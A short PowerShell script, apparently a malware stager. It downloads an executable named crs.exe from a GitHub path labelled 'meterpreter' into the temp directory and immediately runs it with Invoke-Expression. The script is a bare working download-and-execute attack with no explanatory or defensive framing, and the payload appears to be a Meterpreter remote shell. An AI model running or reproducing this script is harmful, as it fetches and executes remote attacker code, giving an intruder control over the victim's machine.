$url="https://github.com/tfairane/Vectors/blob/master/meterpreter/crs.exe?raw=true"
$exe=$env:temp+"\crs.exe"
(New-Object System.Net.WebClient).DownloadFile($url,$exe)
Invoke-Expression($exe)
